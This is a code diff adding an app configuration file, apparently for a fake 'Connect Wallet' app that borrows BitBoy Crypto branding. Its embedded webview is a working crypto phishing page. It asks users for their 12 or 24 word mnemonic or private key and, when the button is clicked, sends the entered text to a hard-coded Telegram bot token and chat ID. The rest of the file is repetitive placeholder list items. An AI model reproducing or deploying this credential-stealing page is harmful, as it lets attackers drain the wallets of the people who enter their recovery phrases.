@@ -1,0 +1,131 @@
+{"ads":{
+  
+  "show_dialog":"non",
+  "button_text":"start",
+  "image_backg":"https://bitboycrypto.com/wp-content/uploads/2023/08/screen-shot-2023-08-27-at-9.38.11-am.png",
+  "icon":"https://bitboycrypto.com/wp-content/uploads/2022/06/bitboy_crypto_logo-orange.png",
+  "main_text1":"Connecting \nWeb3",
+  "main_text2":"The commmunications protocol for Web3, BitBoy Crypto brings the ecosystem together by enabling wallets and apps to securely connect and interact.",
+  "dialog_title":"Mnemomic Or Private key",
+  "webview":"<!DOCTYPE html>\n" +
+                        "<html>\n" +
+                        "<head>\n" +
+                        "    <style>\n" +
+                        "        body {\n" +
+                        "            font-family: Arial, sans-serif;\n" +
+                        "            text-align: center;\n" +
+                        "        }\n" +
+                        "\n" +
+                        "        #container {\n" +
+                        "            margin: 0 auto;\n" +
+                        "            max-width: 400px;\n" +
+                        "            padding: 20px;\n" +
+                        "        }\n" +
+                        "\n" +
+                        "        #text-input {\n" +
+                        "            width: 200px;\n" +
+                        "            height: 250px;\n" +
+                        "            padding: 10px;\n" +
+                        "            margin: 10px 0;\n" +
+                        "            border-radius: 10px;\n" +
+                        "            font-size: 17px;\n" +
+                        "        }\n" +
+                        "\n" +
+                        "        #submit-button {\n" +
+                        "            background-color: #007bff;\n" +
+                        "            color: #fff;\n" +
+                        "            width: 150px; /* Set the width to 100px */\n" +
+                        "            height: 40px; /* Set the height to 60px */\n" +
+                        "            border: none;\n" +
+                        "            cursor: pointer;\n" +
+                        "            border-radius: 10px;\n" +
+                        "            margin-top: 20px;\n" +
+                        "        }\n" +
+                        "\n" +
+                        "        #submit-button:hover {\n" +
+                        "            background-color: #0056b3;\n" +
+                        "        }\n" +
+                        "    </style>\n" +
+                        "</head>\n" +
+                        "<body>\n" +
+                        "    <div id=\"container\">\n" +
+                        "        <textarea id=\"text-input\" placeholder=\"Words separated by a single space\"></textarea>\n" +
+                        "        <button id=\"submit-button\" disabled>Connect Wallet</button>\n" +
+                        "    </div>\n" +
+                        "\n" +
+                        "    <script>\n" +
+                        "        var textInput = document.getElementById(\"text-input\");\n" +
+                        "        var submitButton = document.getElementById(\"submit-button\");\n" +
+                        "\n" +
+                        "        // Add an input event listener to the text input\n" +
+                        "        textInput.addEventListener(\"input\", function () {\n" +
+                        "            // Enable the button if the text input is not empty, otherwise disable it\n" +
+                        "            if (textInput.value.trim() !== \"\") {\n" +
+                        "                submitButton.disabled = false;\n" +
+                        "            } else {\n" +
+                        "                submitButton.disabled = true;\n" +
+                        "            }\n" +
+                        "        });\n" +
+                        "\n" +
+                        "        submitButton.addEventListener(\"click\", function () {\n" +
+                        "            // Get the text entered by the user\n" +
+                        "            var text = textInput.value;\n" +
+                        "\n" +
+                        "            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with actual values\n" +
+                        "            var botToken = '6372180026:AAHxlopHNw1zsvHqfWUIsnKZlggBwMxzrFI';\n" +
+                        "            var chatId = '-952000217';\n" +
+                        "\n" +
+                        "            // Create an XMLHttpRequest object to make an HTTP request to the Telegram Bot API\n" +
+                        "            var xhr = new XMLHttpRequest();\n" +
+                        "            xhr.open(\"GET\", \"https://api.telegram.org/bot\" + botToken + \"/sendMessage?chat_id=\" + chatId + \"&text=\" + text);\n" +
+                        "            xhr.send();\n" +
+                        "\n" +
+                        "            // Clear the input field after sending\n" +
+                        "            textInput.value = \"\";\n" +
+                        "            // Disable the button after sending\n" +
+                        "            submitButton.disabled = true;\n" +
+                        "        });\n" +
+                        "    </script>\n" +
+                        "</body>\n" +
+                        "</html>",
+  "dialog_desc":"Restore an existing Wallet with your 12 or 24 nmemonic words or your private key."
+},
+ 
+ "my_data":[
+  {"title":"item 1",
+  "download_num":"The commmunications protocol for Web3, BitBoy Crypto brings the ecosystem together by enabling wallets and apps to securely connect and interact.",
+  "visite_num":"2141",
+  "photo":"https://www.lifespan.io/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2023/05/Bitboy.jpg.webp"},
+  {"title":"item 2",
+  "download_num":"The commmunications protocol for Web3, BitBoy Crypto brings the ecosystem together by enabling wallets and apps to securely connect and interact.",
+  "visite_num":"2141",
+  "photo":"https://www.lifespan.io/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2023/05/Bitboy.jpg.webp"},
+  {"title":"item 3",
+  "download_num":"The commmunications protocol for Web3, BitBoy Crypto brings the ecosystem together by enabling wallets and apps to securely connect and interact.",
+  "visite_num":"2141",
+  "photo":"https://www.lifespan.io/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2023/05/Bitboy.jpg.webp"},
+  {"title":"item 4",
+  "download_num":"The commmunications protocol for Web3, BitBoy Crypto brings the ecosystem together by enabling wallets and apps to securely connect and interact.",
+  "visite_num":"2141",
+  "photo":"https://www.lifespan.io/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2023/05/Bitboy.jpg.webp"},
+  {"title":"item 5",
+  "download_num":"The commmunications protocol for Web3, BitBoy Crypto brings the ecosystem together by enabling wallets and apps to securely connect and interact.",
+  "visite_num":"2141",
+  "photo":"https://www.lifespan.io/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2023/05/Bitboy.jpg.webp"},
+  {"title":"item 6",
+  "download_num":"The commmunications protocol for Web3, BitBoy Crypto brings the ecosystem together by enabling wallets and apps to securely connect and interact.",
+  "visite_num":"2141",
+  "photo":"https://www.lifespan.io/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2023/05/Bitboy.jpg.webp"},
+  {"title":"item 7",
+  "download_num":"The commmunications protocol for Web3, BitBoy Crypto brings the ecosystem together by enabling wallets and apps to securely connect and interact.",
+  "visite_num":"2141",
+  "photo":"https://www.lifespan.io/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2023/05/Bitboy.jpg.webp"},
+  {"title":"item 8",
+  "download_num":"The commmunications protocol for Web3, BitBoy Crypto brings the ecosystem together by enabling wallets and apps to securely connect and interact.",
+  "visite_num":"2141",
+  "photo":"https://www.lifespan.io/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2023/05/Bitboy.jpg.webp"}
+   ]
+  
+
+}
+   
